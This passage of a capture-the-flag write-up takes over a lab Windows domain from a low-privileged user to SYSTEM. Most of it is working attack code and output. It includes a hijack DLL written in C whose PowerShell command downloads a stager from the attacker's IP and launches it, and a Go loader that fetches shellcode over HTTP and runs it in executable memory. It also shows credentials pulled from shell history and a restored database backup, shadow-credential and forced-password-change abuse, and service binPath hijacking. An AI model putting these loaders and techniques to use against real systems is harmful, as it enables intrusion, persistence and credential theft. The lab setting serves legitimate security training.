[+] Attempting to write data to 't.dalton.pfx'
[+] Data written to 't.dalton.pfx'
[*] Wrote certificate and private key to 't.dalton.pfx'
```

Now i have the certificate i can get the NTLM

```python
certipy-ad auth -pfx t.dalton.pfx -dc-ip 10.1.209.181            
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 't.dalton@northstone.local'
[*]     Security Extension SID: 'S-1-5-21-2679383190-2392193949-2554118403-1106'
[*] Using principal: 't.dalton@northstone.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 't.dalton.ccache'
[*] Wrote credential cache to 't.dalton.ccache'
[*] Trying to retrieve NT hash for 't.dalton'
[*] Got hash for 't.dalton@northstone.local': aad3b435b51404eeaad3b435b51404ee:d02a87eeb5afb4958f19b10ab08fbe22
```

So with ESC13 i cant use the NTLM i have to use the `.ccache` file

# WINRM access as `t.dalton`

```python
export KRB5CCNAME=t.dalton.ccache
```

```python
sudo nxc smb dc.northstone.local -u t.dalton -p '123tonyd' --generate-krb5-file /etc/krb5.conf
[sudo] password for kali: 
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] krb5 conf saved to: /etc/krb5.conf
SMB         10.1.209.181    445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         10.1.209.181    445    DC               [+] northstone.local\t.dalton:123tonyd 
```

```python
export KRB5_CONFIG=/etc/krb5.conf
```

After running these commands i should now be able to access WINRM using realm

```python
evil-winrm -i dc.northstone.local -u t.dalton -r northstone.local 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\t.dalton\Documents>
```

I now have access

Now going back to bloodhound i remember i was part of a group that had write access to some parts of program files!

```python
cat WindowsUpdateChecker_Test_Setup.eml 
Hi Tony,

I wanted to give you a quick update on the WindowsUpdateChecker tool we’ve been working on.

For testing purposes, I set up a scheduled task that runs the application every two minutes under my own user context (c.white). The idea was to simulate a continuous update-checking mechanism without overcomplicating the setup at this stage.

Right now, the behavior is pretty straightforward:

The task starts the tool every 1 minute
The application performs its update check
It then closes automatically after completing the check

At the moment, there is no console output, so everything runs silently in the background.

This gives us a controlled loop for testing stability and execution.

That said, there’s still quite a bit of work ahead. We especially need to improve how the tool handles its modules and overall structure.

Also, the DLL you created earlier unfortunately didn’t work as expected, so we’ll need to revisit that part.

For the next step, please create a x64 DLL that integrates properly with the application and place it in the appropriate directory used by the tool. This part will be critical for extending functionality later on, so feel free to design it with flexibility in mind.

Let’s sync once you’ve had time to review and implement this.

– Carls
```

Also found an interesting email on the desktop of `t.dalton`

# DLL Hijacking

So the email guided me to the windows update checker

```python
*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker> dir


    Directory: C:\Program Files\WindowsUpdateChecker


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2026  11:40 AM                modules
-a----         5/5/2026   8:44 AM           6656 WindowsUpdateChecker.exe


*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker>
```

```python
*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker\modules> icacls .
. NORTHSTONE\t.dalton:(M)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
```

As seen here my current user has `(M)` on this modules directory, this means i have read write and execute on this directory, but whats important is write since this program executes every minute anyway

Ive downloaded the exe as well for some reverse engineering!

![](Pasted%20image%2020260729201502.png)

Using ILspy i reverse engineered the `.exe` and find its loading a dll in the modules directory called `wuaclt.dll` 

Since i have full write access on this i should be able to plant a malicious DLL so when it loads it calls back to my listener

Ill use the following c code

```python
#include <windows.h>
		
#pragma comment(lib, "user32.lib")
		
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		    WinExec("powershell -c wget http://10.200.75.73/test.txt -o test.txt", SW_SHOW);
		    break;
	}
		
	return TRUE;
}
```

Ill then set a python web server

```python
python3 -m http.server 80
```

```python
x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
```

Ill then compile it

```python
*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker\modules> upload wuaclt.dll
                                        
Info: Uploading /home/kali/hsm/NorthStone/wuaclt.dll to C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll
                                        
Data: 116224 bytes of 116224 bytes copied
                                        
Info: Upload successful!
```

Then ill upload it and after a minute:

```python
python3 -m http.server 80                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.1.209.181 - - [29/Jul/2026 20:59:52] code 404, message File not found
10.1.209.181 - - [29/Jul/2026 20:59:52] "GET /test.txt HTTP/1.1" 404 -
```

It reaches back to me!

This means the C code works, i just need to figure out the best way to trigger a reverse shell!

# Beacon as `c.white`

```c
#include <windows.h>
		
#pragma comment(lib, "user32.lib")
		
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		    WinExec("powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest http://10.200.75.73/stager.exe -OutFile $env:APPDATA\\stager.exe; Start-Process $env:APPDATA\\stager.exe\"", SW_SHOW);
		    break;
	}
		
	return TRUE;
}
```

First ill modify the code used for the DLL, to get the stager and store it in `C:\Temp`

```python
x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
```

Then ill compile the DLL

```go
// +build windows
			
package main
			
import (
	"io"
	"net/http"
	"syscall"
	"unsafe"
	)
			
var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
	)
			
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	)
			
func downloadShellcode(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
		}
	defer resp.Body.Close()
			
	return io.ReadAll(resp.Body)
	}
			
func executeShellcode(shellcode []byte) {
	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		panic(err)
	}
			
	// Copy shellcode into allocated memory
	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
	}
		
	// Execute shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}
		

func main() {
	url := "http://10.200.75.73/http.x64.bin"
			
	shellcode, err := downloadShellcode(url)
	if err != nil {
		panic(err)
	}
			
	executeShellcode(shellcode)
}
```

Then ill create a file called `stager.go` which will call back to my server and fetch `http.x64.bin` and execute it!

```python
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
```

Then ill compile `stager.go` into `stager.exe`

Then the last few steps!

Ill start up the adaptix teamserver and client and set the listener

![](Pasted%20image%2020260730201235.png)

And ill generate the shellcode called `http.x64.bin`

Then finally ill start a python webserver 

```python
python3 -m http.server 80
```

```python
*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker\modules> upload wuaclt.dll
                                        
Info: Uploading /home/kali/hsm/NorthStone/wuaclt.dll to C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll
                                        
Data: 116224 bytes of 116224 bytes copied
                                        
Info: Upload successful!
```

Then ill overwrite the previous DLL

![](Pasted%20image%2020260730203351.png)

I now have a beacon as this user!

# Enumeration as `c.white`

```python
+--- Task [bcbca4e5] closed ----------------------------------------------------------+

[30/07 20:52:01] operator [332809d9] beacon > cat C:/Users/c.white/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
[30/07 20:52:01] [*] Task: read file
[30/07 20:52:03] [*] Agent called server, sent [113 bytes]
[30/07 20:52:04] [+] 'C:/Users/c.white/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt' file content:
whoami
sqlcmd -S localhost -U backup_operator -P 'BackupOps2026!'
icacls "C:\BackupDB"
cd C:\BackupDB
dir

+--- Task [332809d9] closed ----------------------------------------------------------+
```

Found credentials

```python
nxc mssql dc.northstone.local -u backup_operator -p 'BackupOps2026!' --local-auth 
MSSQL       10.1.209.181    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (EncryptionReq:False)
MSSQL       10.1.209.181    1433   DC               [+] DC\backup_operator:BackupOps2026!
```

These credentials can authenticate me to mssql!

```python
+--- Task [8be78b27] closed ----------------------------------------------------------+

[30/07 20:34:43] operator [39d8682d] beacon > ls
[30/07 20:34:43] [*] Task: list files
[30/07 20:34:45] [*] Agent called server, sent [18 bytes]
[30/07 20:34:45] [+] Listing 'C:\'
 Type     Size           Last Modified         Name
 ----     ---------      ----------------      ----
 dir                     03/05/2026 20:37      $Recycle.Bin
 dir                     07/05/2026 20:14      BackupDB
 dir                     02/05/2026 22:41      Documents and Settings
 dir                     02/05/2026 20:26      inetpub 
 dir                     05/11/2022 19:03      PerfLogs
 dir                     17/06/2026 18:18      Program Files
 dir                     02/05/2026 15:51      Program Files (x86)
 dir                     17/06/2026 18:30      ProgramData
 dir                     02/05/2026 13:43      Recovery
 dir                     02/05/2026 16:17      SQL2019 
 dir                     02/05/2026 15:38      System Volume Information
 dir                     30/07/2026 18:34      Temp    
 dir                     07/05/2026 19:46      Users   
 dir                     17/06/2026 18:38      Windows 
          512.00 Mb      30/07/2026 18:25      pagefile.sys

+--- Task [39d8682d] closed ----------------------------------------------------------+
```

Interesting directory `BackupDB`

```python
+--- Task [827c32b7] closed ----------------------------------------------------------+

[30/07 20:37:01] operator [0b150201] beacon > ls
[30/07 20:37:01] [+] Listing 'C:\BackupDB'
 Type     Size           Last Modified         Name
 ----     ---------      ----------------      ----
          2.84 Mb        07/05/2026 20:14      NorthStoneDB.bak
          0.48 Kb        10/05/2026 12:35      NorthStoneDB_Notes.txt

+--- Task [0b150201] closed ----------------------------------------------------------+
```

Ill download both of these files

```python
cat NorthStoneDB_Notes.txt 
Database: NorthStoneDB (MSSQLSERVER)

Backup Verification Summary:

Tables identified in backup:

* Properties (36 records)
* auth_test_users (3 records)

Notes:

* The auth_test_users table was removed from the live/original database after testing.
* Backup file: NorthStoneDB.bak
* Backup location: C:\BackupDB
* Backup operations were performed by the MSSQLSERVER instance (TCP 1433).
* Backup and restore operations were executed using the MSSQL user backup_operator.
```

So with the creds that get me access over mssql i can login using the impacket script

```python
impacket-mssqlclient northstone.local/backup_operator:'BackupOps2026!'@dc.northstone.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (backup_operator  backup_operator@master)>

SQL (backup_operator  backup_operator@master)> RESTORE DATABASE NorthStoneDB FROM DISK = 'C:\BackupDB\NorthStoneDB.bak'
INFO(DC): Line 1: Processed 352 pages for database 'NorthStoneDB', file 'NorthStoneDB' on file 1.
INFO(DC): Line 1: Processed 1 pages for database 'NorthStoneDB', file 'NorthStoneDB_log' on file 1.
INFO(DC): Line 1: RESTORE DATABASE successfully processed 353 pages in 0.042 seconds (65.511 MB/sec).
SQL (backup_operator  backup_operator@master)>
```

Now the DB should be restored!

```python
SQL (backup_operator  backup_operator@master)> USE NorthStoneDB
ENVCHANGE(DATABASE): Old Value: master, New Value: NorthStoneDB
INFO(DC): Line 1: Changed database context to 'NorthStoneDB'.
SQL (backup_operator  backup_operator@NorthStoneDB)>

SQL (backup_operator  backup_operator@NorthStoneDB)> SELECT * FROM auth_test_users
id   Username     PasswordValue     
--   ----------   ---------------   
 4   c.white      pa$$w0rd72872     
 5   j.sullivan   J$7kP!9vLx#2Qa    
 6   k.bennett    B#8tL!2qPz@6YxM   
SQL (backup_operator  backup_operator@NorthStoneDB)> 
```

Now ill dump the previously empty  table!

Now i can use these creds and try to authenticate!

# Compromising `c.white` and `k.bennett`

```python
nxc smb dc.northstone.local -u c.white -p 'pa$$w0rd72872'                         
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\c.white:pa$$w0rd72872
```

I now have `c.white` credentials!

```python
nxc smb dc.northstone.local -u k.bennett -p 'B#8tL!2qPz@6YxM'
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\k.bennett:B#8tL!2qPz@6YxM
```

I also got access as `k.bennett`

![735](Pasted%20image%2020260730211004.png)

ForceChangePassword on three users!

![742](Pasted%20image%2020260730211122.png)

The user `r.parker` seems the most interesting here, since he has GenericWrite on three users

# Compromising `r.parker`

So my current user has ForceChangePassword on three users and `r.parker` seems the most interesting

```python
nxc smb dc.northstone.local -u k.bennett -p 'B#8tL!2qPz@6YxM' -M change-password -o USER=r.parker NEWPASS=Password123!
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\k.bennett:B#8tL!2qPz@6YxM 
CHANGE-P... 10.1.209.181    445    DC               [+] Successfully changed password for r.parker
```

Now the password should be changed i can verify this to be safe:

```python
nxc smb dc.northstone.local -u r.parker -p 'Password123!'                                                    
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\r.parker:Password123!
```

This user is now compromised!

![679](Pasted%20image%2020260730211635.png)

So of the users `r.parker` has GenericWrite on `l.turner` looks the most interesting since he is part of the print services operators group and also remote management

# Compromising `l.turner`

So first ill try a tagrted kerberoast attack and try to get his password

```python
bloodyAD --host dc.northstone.local -d northstone.local -u r.parker -p 'Password123!' set object 'l.turner' servicePrincipalName -v 'service/hacked' 

[+] l.turner's servicePrincipalName has been updated
```

First ill add an SPN

But for some reason i cannot get the hash!

So ill try a shadow creds attack

## Shadow Credentials

https://www.hackingarticles.in/shadow-credentials-attack/

```python
certipy-ad shadow auto -u r.parker@northstone.local -p 'Password123!' -account 'l.turner' 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: NORTHSTONE.LOCAL.
[!] Use -debug to print a stacktrace
[*] Targeting user 'l.turner'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'cfe00095444f4680ba9563259a16e39b'
[*] Adding Key Credential with device ID 'cfe00095444f4680ba9563259a16e39b' to the Key Credentials for 'l.turner'
[*] Successfully added Key Credential with device ID 'cfe00095444f4680ba9563259a16e39b' to the Key Credentials for 'l.turner'
[*] Authenticating as 'l.turner' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'l.turner@northstone.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'l.turner.ccache'
[*] Wrote credential cache to 'l.turner.ccache'
[*] Trying to retrieve NT hash for 'l.turner'
[*] Restoring the old Key Credentials for 'l.turner'
[*] Successfully restored the old Key Credentials for 'l.turner'
[*] NT hash for 'l.turner': 59c717e891bebfce8cab55d4d50751eb
```

I now have the NT hash

```python
xc smb dc.northstone.local -u l.turner -H '59c717e891bebfce8cab55d4d50751eb' 
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\l.turner:59c717e891bebfce8cab55d4d50751eb
```

This user is now compromised!

Now checking the group print service operators i see a description:

```python
Description:

Members of this group are responsible for managing printer-related operations. This includes access to printer service files, directories, and scheduled tasks used for maintenance and monitoring
```

# Domain Admin

So i noticed an interesting directory in the program files that isnt usually there:

```python
*Evil-WinRM* PS C:\Program Files\PrintNotify> dir


    Directory: C:\Program Files\PrintNotify


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2022  11:58 AM          51736 printer.exe
```

I can try and upload a beacon payload into this directory since i have (M) read/write/execute of this directory, then change the `binPath`

So ill use the stager.go code from earlier, since the http.x64.bin payload holds the correct listener info that is also still running

So this code will still work since it pulls from the webserver and get the shellcode then execute it

```python
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
```

Ill recompile it since i deleted the .exe from earlier

```python
*Evil-WinRM* PS C:\Program Files\PrintNotify> upload stager.exe
                                        
Info: Uploading /home/kali/hsm/NorthStone/stager.exe to C:\Program Files\PrintNotify\stager.exe
                                        
Data: 11358888 bytes of 11358888 bytes copied
                                        
Info: Upload successful!
```

```python
*Evil-WinRM* PS C:\Program Files\PrintNotify> sc.exe config PrintNotifyService binPath= "C:\Program Files\PrintNotify\stager.exe"
[SC] ChangeServiceConfig SUCCESS
```

Then after uploading ill change the `binPath`

```python
python3 -m http.server 80
```

Ill start a webserver so the stager can reach back in pull the shellcode

```python
*Evil-WinRM* PS C:\Program Files\PrintNotify> sc.exe start PrintNotifyService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Now after starting it:

![](Pasted%20image%2020260730220130.png)

I now have a SYSTEM beacon

```python
[30/07 21:59:35] operator [93095ca9] beacon > getuid
[30/07 21:59:35] [*] Task: get username of current token
[30/07 21:59:35] [*] Agent called server, sent [12 bytes]
[30/07 21:59:35] [+] You are 'NT AUTHORITY\SYSTEM' (elevated)

+--- Task [93095ca9] closed ----------------------------------------------------------+
```

I am now NT authority

```python
+-------------------------------------------------------------------------------------+

[30/07 22:03:11] operator [e300265e] beacon > cat C:\Users\Administrator\Desktop\root.txt
[30/07 22:03:11] [*] Task: read file
[30/07 22:03:14] [*] Agent called server, sent [56 bytes]
[30/07 22:03:14] [+] 'C:\Users\Administrator\Desktop\root.txt' file content:
﻿
FLAG[printer_service_abused]


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣿⠿⢿⣿⣿⡿⣿⣿⣷⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⢋⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠦⡄⠀⠀⣀⣀⣤⣤⣴⢤⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠃⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢿⣿⣿⣿⣿⣿⠿⢛⣀⣤⣤⣄⣄⣀⣻⣻⣘⣠⣤⣧⣿⣧⣤⣿⣿⣿⣿⠇⣿⠻⢜⡻⠿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣿⣿⣿⣻⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣩⣾⣿⣿⣿⣿⠟⣸⡇⠰⡦⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡿⣿⣭⣛⡛⠿⣿⣿⡿⠿⠿⠿⠟⢿⣛⣹⣽⣯⣶⣿⣿⣿⣿⣿⣿⣏⠸⣟⣓⣢⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣟⣿⣯⣿⣿⣿⣷⣋⣀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠉⠉⠉⠙⠋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⣿⣿⣿⣿⣿⣽⣯⣽⣷⡆⠀⠀⠻⠿⠓⠛⠛⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⣭⡹

+--- Task [e300265e] closed ----------------------------------------------------------+
```

```python
[30/07 22:04:02] operator [8d4b1fe4] beacon > powershell whoami /priv
[30/07 22:04:02] [*] Task: create new process
[30/07 22:04:04] [*] Agent called server, sent [95 bytes]
[30/07 22:04:04] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c whoami /priv started with PID 4184 (output - with output)
[30/07 22:04:08] [+] Job [8d4b1fe4] output:

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
[30/07 22:04:08] [+] Job [8d4b1fe4] finished

+--- Task [8d4b1fe4] closed ----------------------------------------------------------+
```

Domain Admin!


